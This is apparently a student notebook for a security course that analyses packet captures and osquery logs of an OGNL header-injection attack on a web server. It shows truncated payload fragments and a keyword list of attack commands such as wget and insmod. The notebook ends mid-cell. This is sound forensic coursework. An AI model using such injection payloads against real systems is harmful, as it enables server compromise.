{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Akhilesh Somani (somani4), Gowtham Kuntumalla (gowtham4), Manan Mehta (mananm2) - MP3"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "metadata": {},
   "outputs": [],
   "source": [
    "import pandas as pd\n",
    "import numpy as np\n",
    "\n",
    "import pyshark\n",
    "from pandas.io.json import json_normalize\n",
    "import json\n",
    "\n",
    "import matplotlib.pyplot as plt\n",
    "import seaborn as sns\n",
    "\n",
    "from pgmpy.factors.discrete import DiscreteFactor\n",
    "from pgmpy.models import FactorGraph\n",
    "from pgmpy.inference import BeliefPropagation\n",
    "\n",
    "from collections import Counter"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Task 0"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "http = pyshark.FileCapture('http.pcap', keep_packets=True)\n",
    "http2 = pyshark.FileCapture('http2.pcap', keep_packets=True)\n",
    "dns = pyshark.FileCapture('dns.pcap', keep_packets=True)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>timestamp</th>\n",
       "      <th>highest_layer</th>\n",
       "      <th>length</th>\n",
       "      <th>dest_ip</th>\n",
       "      <th>dest_port</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>1.521395e+09</td>\n",
       "      <td>TCP</td>\n",
       "      <td>58</td>\n",
       "      <td>172.17.0.2</td>\n",
       "      <td>8080</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>1.521395e+09</td>\n",
       "      <td>TCP</td>\n",
       "      <td>58</td>\n",
       "      <td>10.0.2.2</td>\n",
       "      <td>55952</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>1.521395e+09</td>\n",
       "      <td>TCP</td>\n",
       "      <td>54</td>\n",
       "      <td>172.17.0.2</td>\n",
       "      <td>8080</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>1.521395e+09</td>\n",
       "      <td>HTTP</td>\n",
       "      <td>766</td>\n",
       "      <td>172.17.0.2</td>\n",
       "      <td>8080</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>1.521395e+09</td>\n",
       "      <td>TCP</td>\n",
       "      <td>54</td>\n",
       "      <td>10.0.2.2</td>\n",
       "      <td>55952</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "      timestamp highest_layer length     dest_ip dest_port\n",
       "0  1.521395e+09           TCP     58  172.17.0.2      8080\n",
       "1  1.521395e+09           TCP     58    10.0.2.2     55952\n",
       "2  1.521395e+09           TCP     54  172.17.0.2      8080\n",
       "3  1.521395e+09          HTTP    766  172.17.0.2      8080\n",
       "4  1.521395e+09           TCP     54    10.0.2.2     55952"
      ]
     },
     "execution_count": 3,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "df_data = []\n",
    "for pkt in http:\n",
    "    if len(pkt.layers) < 3:\n",
    "        continue\n",
    "    if pkt[2].layer_name != 'tcp':\n",
    "        continue\n",
    "    \n",
    "    d = {\n",
    "        'timestamp': pkt.sniff_time.timestamp(),\n",
    "        'highest_layer': pkt.highest_layer,\n",
    "        'length': pkt.length,\n",
    "        'dest_ip': pkt['IP'].dst,\n",
    "        'dest_port': pkt['TCP'].dstport\n",
    "    }\n",
    "    df_data.append(d)\n",
    "\n",
    "df_http = pd.DataFrame(df_data)\n",
    "df_http.head()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>timestamp</th>\n",
       "      <th>highest_layer</th>\n",
       "      <th>length</th>\n",
       "      <th>dest_ip</th>\n",
       "      <th>dest_port</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>1.553740e+09</td>\n",
       "      <td>TLS</td>\n",
       "      <td>55</td>\n",
       "      <td>74.125.124.95</td>\n",
       "      <td>443</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>1.553740e+09</td>\n",
       "      <td>TCP</td>\n",
       "      <td>66</td>\n",
       "      <td>10.194.59.155</td>\n",
       "      <td>61103</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>1.553740e+09</td>\n",
       "      <td>TLS</td>\n",
       "      <td>55</td>\n",
       "      <td>104.25.218.21</td>\n",
       "      <td>443</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>1.553740e+09</td>\n",
       "      <td>TCP</td>\n",
       "      <td>66</td>\n",
       "      <td>10.194.59.155</td>\n",
       "      <td>64299</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>1.553740e+09</td>\n",
       "      <td>TCP</td>\n",
       "      <td>55</td>\n",
       "      <td>151.101.184.193</td>\n",
       "      <td>80</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "      timestamp highest_layer length          dest_ip dest_port\n",
       "0  1.553740e+09           TLS     55    74.125.124.95       443\n",
       "1  1.553740e+09           TCP     66    10.194.59.155     61103\n",
       "2  1.553740e+09           TLS     55    104.25.218.21       443\n",
       "3  1.553740e+09           TCP     66    10.194.59.155     64299\n",
       "4  1.553740e+09           TCP     55  151.101.184.193        80"
      ]
     },
     "execution_count": 4,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "df_data = []\n",
    "for pkt in http2:\n",
    "    if len(pkt.layers) < 3:\n",
    "        continue\n",
    "    if pkt[2].layer_name != 'tcp':\n",
    "        continue\n",
    "    \n",
    "    d = {\n",
    "        'timestamp': pkt.sniff_time.timestamp(),\n",
    "        'highest_layer': pkt.highest_layer,\n",
    "        'length': pkt.length,\n",
    "        'dest_ip': pkt['IP'].dst,\n",
    "        'dest_port': pkt['TCP'].dstport\n",
    "    }\n",
    "    df_data.append(d)\n",
    "\n",
    "df_http2 = pd.DataFrame(df_data)\n",
    "df_http2.head()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>timestamp</th>\n",
       "      <th>highest_layer</th>\n",
       "      <th>length</th>\n",
       "      <th>dest_ip</th>\n",
       "      <th>source_ip</th>\n",
       "      <th>dest_port</th>\n",
       "      <th>source_port</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>1.521397e+09</td>\n",
       "      <td>DNS</td>\n",
       "      <td>88</td>\n",
       "      <td>162.212.156.148</td>\n",
       "      <td>10.0.2.15</td>\n",
       "      <td>53</td>\n",
       "      <td>43204</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>1.521397e+09</td>\n",
       "      <td>DNS</td>\n",
       "      <td>93</td>\n",
       "      <td>10.0.2.15</td>\n",
       "      <td>162.212.156.148</td>\n",
       "      <td>43204</td>\n",
       "      <td>53</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>1.521397e+09</td>\n",
       "      <td>DNS</td>\n",
       "      <td>88</td>\n",
       "      <td>162.212.156.148</td>\n",
       "      <td>10.0.2.15</td>\n",
       "      <td>53</td>\n",
       "      <td>43204</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>1.521397e+09</td>\n",
       "      <td>DNS</td>\n",
       "      <td>93</td>\n",
       "      <td>10.0.2.15</td>\n",
       "      <td>162.212.156.148</td>\n",
       "      <td>43204</td>\n",
       "      <td>53</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>1.521397e+09</td>\n",
       "      <td>DNS</td>\n",
       "      <td>88</td>\n",
       "      <td>162.212.156.148</td>\n",
       "      <td>10.0.2.15</td>\n",
       "      <td>53</td>\n",
       "      <td>43204</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "      timestamp highest_layer length          dest_ip        source_ip  \\\n",
       "0  1.521397e+09           DNS     88  162.212.156.148        10.0.2.15   \n",
       "1  1.521397e+09           DNS     93        10.0.2.15  162.212.156.148   \n",
       "2  1.521397e+09           DNS     88  162.212.156.148        10.0.2.15   \n",
       "3  1.521397e+09           DNS     93        10.0.2.15  162.212.156.148   \n",
       "4  1.521397e+09           DNS     88  162.212.156.148        10.0.2.15   \n",
       "\n",
       "  dest_port source_port  \n",
       "0        53       43204  \n",
       "1     43204          53  \n",
       "2        53       43204  \n",
       "3     43204          53  \n",
       "4        53       43204  "
      ]
     },
     "execution_count": 5,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "df_data = []\n",
    "for pkt in dns:\n",
    "    if len(pkt.layers) < 3:\n",
    "        continue\n",
    "    if pkt[2].layer_name != 'udp':\n",
    "        continue\n",
    "    \n",
    "    d = {\n",
    "        'timestamp': pkt.sniff_time.timestamp(),\n",
    "        'highest_layer': pkt.highest_layer,\n",
    "        'length': pkt.length,\n",
    "        'dest_ip': pkt['IP'].dst,\n",
    "        'source_ip': pkt['IP'].src,\n",
    "        'dest_port': pkt['UDP'].dstport,\n",
    "        'source_port': pkt['UDP'].srcport\n",
    "    }\n",
    "    df_data.append(d)\n",
    "\n",
    "df_dns = pd.DataFrame(df_data)\n",
    "df_dns.head()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 19,
   "metadata": {
    "scrolled": true
   },
   "outputs": [],
   "source": [
    "data = []\n",
    "with open(\"osqueryd.results.log\", \"r\") as file:\n",
    "    for line in file:\n",
    "        data.append(json.loads(line))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>name</th>\n",
       "      <th>hostIdentifier</th>\n",
       "      <th>calendarTime</th>\n",
       "      <th>unixTime</th>\n",
       "      <th>epoch</th>\n",
       "      <th>counter</th>\n",
       "      <th>action</th>\n",
       "      <th>decorations.host_uuid</th>\n",
       "      <th>decorations.username</th>\n",
       "      <th>columns.name</th>\n",
       "      <th>...</th>\n",
       "      <th>columns.md5</th>\n",
       "      <th>columns.mode</th>\n",
       "      <th>columns.mtime</th>\n",
       "      <th>columns.sha1</th>\n",
       "      <th>columns.sha256</th>\n",
       "      <th>columns.size</th>\n",
       "      <th>columns.target_path</th>\n",
       "      <th>columns.time</th>\n",
       "      <th>columns.transaction_id</th>\n",
       "      <th>columns.uid</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>system_info</td>\n",
       "      <td>ubuntu</td>\n",
       "      <td>Tue Feb  6 00:33:05 2018 UTC</td>\n",
       "      <td>1517877185</td>\n",
       "      <td>0</td>\n",
       "      <td>38463</td>\n",
       "      <td>added</td>\n",
       "      <td>D5882FBF-1D65-4A30-B216-77F664B7D3B0</td>\n",
       "      <td>root</td>\n",
       "      <td>rk</td>\n",
       "      <td>...</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>pack_fim_file_events</td>\n",
       "      <td>ubuntu</td>\n",
       "      <td>Tue Feb  6 00:33:49 2018 UTC</td>\n",
       "      <td>1517877229</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>added</td>\n",
       "      <td>D5882FBF-1D65-4A30-B216-77F664B7D3B0</td>\n",
       "      <td>root</td>\n",
       "      <td>NaN</td>\n",
       "      <td>...</td>\n",
       "      <td>0d4f52b9dacac07cf2316d1686cc707c</td>\n",
       "      <td>0644</td>\n",
       "      <td>1517877228</td>\n",
       "      <td>cffc9b8ead76006419975c0d22ba49d5fdf001a0</td>\n",
       "      <td>43d11069f7682e63289f38d184e4193f7486502f099250...</td>\n",
       "      <td>4096</td>\n",
       "      <td>/etc/osquery/.osquery.conf.swp</td>\n",
       "      <td>1517877228</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>pack_fim_file_events</td>\n",
       "      <td>ubuntu</td>\n",
       "      <td>Tue Feb  6 00:33:49 2018 UTC</td>\n",
       "      <td>1517877229</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>added</td>\n",
       "      <td>D5882FBF-1D65-4A30-B216-77F664B7D3B0</td>\n",
       "      <td>root</td>\n",
       "      <td>NaN</td>\n",
       "      <td>...</td>\n",
       "      <td></td>\n",
       "      <td></td>\n",
       "      <td></td>\n",
       "      <td></td>\n",
       "      <td></td>\n",
       "      <td></td>\n",
       "      <td>/etc/osquery/.osquery.conf.swx</td>\n",
       "      <td>1517877228</td>\n",
       "      <td>0</td>\n",
       "      <td></td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>pack_fim_file_events</td>\n",
       "      <td>ubuntu</td>\n",
       "      <td>Tue Feb  6 00:33:49 2018 UTC</td>\n",
       "      <td>1517877229</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>added</td>\n",
       "      <td>D5882FBF-1D65-4A30-B216-77F664B7D3B0</td>\n",
       "      <td>root</td>\n",
       "      <td>NaN</td>\n",
       "      <td>...</td>\n",
       "      <td></td>\n",
       "      <td></td>\n",
       "      <td></td>\n",
       "      <td></td>\n",
       "      <td></td>\n",
       "      <td></td>\n",
       "      <td>/etc/osquery/.osquery.conf.swx</td>\n",
       "      <td>1517877228</td>\n",
       "      <td>0</td>\n",
       "      <td></td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>pack_fim_file_events</td>\n",
       "      <td>ubuntu</td>\n",
       "      <td>Tue Feb  6 00:33:49 2018 UTC</td>\n",
       "      <td>1517877229</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>added</td>\n",
       "      <td>D5882FBF-1D65-4A30-B216-77F664B7D3B0</td>\n",
       "      <td>root</td>\n",
       "      <td>NaN</td>\n",
       "      <td>...</td>\n",
       "      <td></td>\n",
       "      <td></td>\n",
       "      <td></td>\n",
       "      <td></td>\n",
       "      <td></td>\n",
       "      <td></td>\n",
       "      <td>/etc/osquery/.osquery.conf.swx</td>\n",
       "      <td>1517877228</td>\n",
       "      <td>0</td>\n",
       "      <td></td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "<p>5 rows × 27 columns</p>\n",
       "</div>"
      ],
      "text/plain": [
       "                   name hostIdentifier                  calendarTime  \\\n",
       "0           system_info         ubuntu  Tue Feb  6 00:33:05 2018 UTC   \n",
       "1  pack_fim_file_events         ubuntu  Tue Feb  6 00:33:49 2018 UTC   \n",
       "2  pack_fim_file_events         ubuntu  Tue Feb  6 00:33:49 2018 UTC   \n",
       "3  pack_fim_file_events         ubuntu  Tue Feb  6 00:33:49 2018 UTC   \n",
       "4  pack_fim_file_events         ubuntu  Tue Feb  6 00:33:49 2018 UTC   \n",
       "\n",
       "     unixTime epoch counter action                 decorations.host_uuid  \\\n",
       "0  1517877185     0   38463  added  D5882FBF-1D65-4A30-B216-77F664B7D3B0   \n",
       "1  1517877229     0       0  added  D5882FBF-1D65-4A30-B216-77F664B7D3B0   \n",
       "2  1517877229     0       0  added  D5882FBF-1D65-4A30-B216-77F664B7D3B0   \n",
       "3  1517877229     0       0  added  D5882FBF-1D65-4A30-B216-77F664B7D3B0   \n",
       "4  1517877229     0       0  added  D5882FBF-1D65-4A30-B216-77F664B7D3B0   \n",
       "\n",
       "  decorations.username columns.name  ...                       columns.md5  \\\n",
       "0                 root           rk  ...                               NaN   \n",
       "1                 root          NaN  ...  0d4f52b9dacac07cf2316d1686cc707c   \n",
       "2                 root          NaN  ...                                     \n",
       "3                 root          NaN  ...                                     \n",
       "4                 root          NaN  ...                                     \n",
       "\n",
       "  columns.mode columns.mtime                              columns.sha1  \\\n",
       "0          NaN           NaN                                       NaN   \n",
       "1         0644    1517877228  cffc9b8ead76006419975c0d22ba49d5fdf001a0   \n",
       "2                                                                        \n",
       "3                                                                        \n",
       "4                                                                        \n",
       "\n",
       "                                      columns.sha256 columns.size  \\\n",
       "0                                                NaN          NaN   \n",
       "1  43d11069f7682e63289f38d184e4193f7486502f099250...         4096   \n",
       "2                                                                   \n",
       "3                                                                   \n",
       "4                                                                   \n",
       "\n",
       "              columns.target_path columns.time columns.transaction_id  \\\n",
       "0                             NaN          NaN                    NaN   \n",
       "1  /etc/osquery/.osquery.conf.swp   1517877228                      0   \n",
       "2  /etc/osquery/.osquery.conf.swx   1517877228                      0   \n",
       "3  /etc/osquery/.osquery.conf.swx   1517877228                      0   \n",
       "4  /etc/osquery/.osquery.conf.swx   1517877228                      0   \n",
       "\n",
       "  columns.uid  \n",
       "0         NaN  \n",
       "1           0  \n",
       "2              \n",
       "3              \n",
       "4              \n",
       "\n",
       "[5 rows x 27 columns]"
      ]
     },
     "execution_count": 7,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "df_osquery = pd.json_normalize(data)\n",
    "df_osquery.head()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "found #cmd in http.pcap at timestamp 1521395061.490042\n",
      "found #cmd in http.pcap at timestamp 1521395073.060337\n",
      "found #cmd in http.pcap at timestamp 1521395109.142614\n",
      "found #cmd in http.pcap at timestamp 1521395122.848523\n",
      "found #cmd in http.pcap at timestamp 1521395147.160066\n",
      "found #cmd in http.pcap at timestamp 1521395162.837276\n",
      "found #cmd in http.pcap at timestamp 1521395163.444769\n"
     ]
    }
   ],
   "source": [
    "httpcmdlog = []\n",
    "for pkt in http:\n",
    "    try:\n",
    "        if \"#cmd\" in pkt.http.content_type:\n",
    "            print('found #cmd in http.pcap at timestamp {}'.format(pkt.sniff_time.timestamp()))\n",
    "            d = {pkt.sniff_time.timestamp(): pkt.http.content_type}\n",
    "            httpcmdlog.append(d)\n",
    "    except AttributeError:\n",
    "        pass\n",
    "\n",
    "if len(httpcmdlog) == 0:\n",
    "    print('http.pcap represents legitimate activity')\n",
    "#the logs are stored in httpcmdlog as a list of dictionaries"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "http2.pcap represents legitimate activity\n"
     ]
    }
   ],
   "source": [
    "http2cmdlog = []\n",
    "for pkt in http2:\n",
    "    try:\n",
    "        if \"#cmd\" in pkt.http.content_type:\n",
    "            print('found #cmd in http.pcap at timestamp {}'.format(pkt.sniff_time.timestamp()))\n",
    "            d = {pkt.sniff_time.timestamp(): pkt.http.content_type}\n",
    "            http2cmdlog.append(d)\n",
    "    except AttributeError:\n",
    "        pass\n",
    "\n",
    "if len(http2cmdlog) == 0:\n",
    "    print('http2.pcap represents legitimate activity')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "There are no Content-Type headers in http2.pcap\n"
     ]
    }
   ],
   "source": [
    "# Question 6(b) - Content Type in legitimate activity i.e. http2\n",
    "http2legitimatelog = []\n",
    "for pkt in http2:\n",
    "    try:\n",
    "        http2legitimatelog.append(pkt.http.content_type)\n",
    "    except AttributeError:\n",
    "        pass\n",
    "if len(http2legitimatelog) == 0:\n",
    "    print('There are no Content-Type headers in http2.pcap')\n",
    "else:\n",
    "    print(http2legitimatelog)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Task 1"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Layer HTTP:\r\n",
      "\tGET /showcase.action HTTP/1.1\\r\\n\r\n",
      "\tExpert Info (Chat/Sequence): GET /showcase.action HTTP/1.1\\r\\n\r\n",
      "\tGET /showcase.action HTTP/1.1\\r\\n\r\n",
      "\tSeverity level: Chat\r\n",
      "\tGroup: Sequence\r\n",
      "\tRequest Method: GET\r\n",
      "\tRequest URI: /showcase.action\r\n",
      "\tRequest Version: HTTP/1.1\r\n",
      "\tHost: localhost:60080\\r\\n\r\n",
      "\tConnection: keep-alive\\r\\n\r\n",
      "\tUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3373.0 Safari/537.36\\r\\n\r\n",
      "\tAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\\r\\n\r\n",
      "\tAccept-Encoding: gzip, deflate, br\\r\\n\r\n",
      "\tAccept-Language: en-US,en;q=0.9,vi;q=0.8\\r\\n\r\n",
      "\t [truncated]Cookie: username-localhost-8889=\"2|1:0|10:1520220538|23:username-localhost-8889|44:ODcxYmJhMGM0NjVjNDZkYjhmZDJkZWVlNWUyZGJjYWI=|f0900eaa7227371fcf37cfcf446c8be5a896dd5aa0123aecff040a323ee711b7\"; _xsrf=2|dffac1db|e5101d421a2bfa\r\n",
      "\tCookie pair: username-localhost-8889=\"2|1:0|10:1520220538|23:username-localhost-8889|44:ODcxYmJhMGM0NjVjNDZkYjhmZDJkZWVlNWUyZGJjYWI=|f0900eaa7227371fcf37cfcf446c8be5a896dd5aa0123aecff040a323ee711b7\"\r\n",
      "\tFull request URI: http://localhost:60080/showcase.action\r\n",
      "\tHTTP request 4/4\r\n",
      "\tPrev request in frame: 28\r\n",
      "\t\\r\\n\r\n",
      "\tUpgrade-Insecure-Requests: 1\\r\\n\r\n",
      "\tDNT: 1\\r\\n\r\n",
      "\tCookie pair: _xsrf=2|dffac1db|e5101d421a2bfae66b2232abbd75196b|1520220538\r\n",
      "\tCookie pair: JSESSIONID=190DD6FAB44A922A9BACFEC2507563C1\r\n",
      "\n",
      "The UNIX timestamp of the first attack is 1521394903.610774\n",
      "The IP address of the vulnerable server is 172.17.0.2\n",
      "The port of the vulnerable server is 8080\n"
     ]
    }
   ],
   "source": [
    "for pkt in http:    \n",
    "    try:\n",
    "        if pkt.http.request_uri == '/showcase.action':\n",
    "            firstattack_timestamp = pkt.sniff_time.timestamp()\n",
    "            print(pkt.http)\n",
    "            break\n",
    "    except AttributeError:\n",
    "        pass\n",
    "\n",
    "firstattack_IP = df_http.set_index('timestamp').loc[firstattack_timestamp, 'dest_ip']\n",
    "firstattack_port = df_http.set_index('timestamp').loc[firstattack_timestamp, 'dest_port']\n",
    "\n",
    "print('The UNIX timestamp of the first attack is {}'.format(firstattack_timestamp))\n",
    "print('The IP address of the vulnerable server is ' + firstattack_IP)\n",
    "print('The port of the vulnerable server is ' + firstattack_port)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>header</th>\n",
       "      <th>length</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>application/x-www-form-urlencoded</td>\n",
       "      <td>33</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>.multipart/form-data~${#context[\"com.opensymph...</td>\n",
       "      <td>144</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>%{(#_='multipart/form-data').(#dm=@ognl.OgnlCo...</td>\n",
       "      <td>806</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>%{(#_='multipart/form-data').(#dm=@ognl.OgnlCo...</td>\n",
       "      <td>810</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>%{(#_='multipart/form-data').(#dm=@ognl.OgnlCo...</td>\n",
       "      <td>818</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>5</th>\n",
       "      <td>%{(#_='multipart/form-data').(#dm=@ognl.OgnlCo...</td>\n",
       "      <td>845</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "                                              header  length\n",
       "0                  application/x-www-form-urlencoded      33\n",
       "1  .multipart/form-data~${#context[\"com.opensymph...     144\n",
       "2  %{(#_='multipart/form-data').(#dm=@ognl.OgnlCo...     806\n",
       "3  %{(#_='multipart/form-data').(#dm=@ognl.OgnlCo...     810\n",
       "4  %{(#_='multipart/form-data').(#dm=@ognl.OgnlCo...     818\n",
       "5  %{(#_='multipart/form-data').(#dm=@ognl.OgnlCo...     845"
      ]
     },
     "execution_count": 12,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "contentheaderlog = []\n",
    "for pkt in http:\n",
    "    try:\n",
    "        if pkt.ip.dst == firstattack_IP:\n",
    "            contentheaderlog.append({\"header\":pkt.http.content_type, \"length\":len(pkt.http.content_type)})\n",
    "    except AttributeError:\n",
    "        pass\n",
    "contentheaderlog = list({v['header']:v for v in contentheaderlog}.values()) #unique values only\n",
    "\n",
    "contentheaderlog_df = pd.DataFrame(contentheaderlog).sort_values('length').reset_index(drop = True)\n",
    "contentheaderlog_df\n",
    "#to view the entire strings in the header, print the list contentheaderlog"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[False, False, False, True, False, False]\n",
      "[False, False, False, False, False, True]\n",
      "[False, False, True, True, True, True]\n",
      "[True, False, False, False, False, False]\n",
      "[False, False, False, False, False, False]\n",
      "[False, False, False, False, True, False]\n",
      "[False, False, False, False, False, False]\n",
      "[False, False, False, False, False, False]\n",
      "The commands present in the attacks are ['whoami', 'wget', 'ls', 'cat', 'insmod']\n"
     ]
    }
   ],
   "source": [
    "commands = ['whoami','wget','ls','cat','cd','insmod','ssh','lsmod']\n",
    "d = []\n",
    "for command in commands:\n",
    "    p = [True if command in header else False for header in contentheaderlog_df.header]\n",
    "    if sum(p)>0:\n",
    "        d.append(command)\n",
    "    print(p)\n",
    "print('The commands present in the attacks are {}'.format(d))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Notice that cat occurs as a part of 'application' string and not as an independent command."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    " "
   ]
  },
  {
   "cell_type": "code",
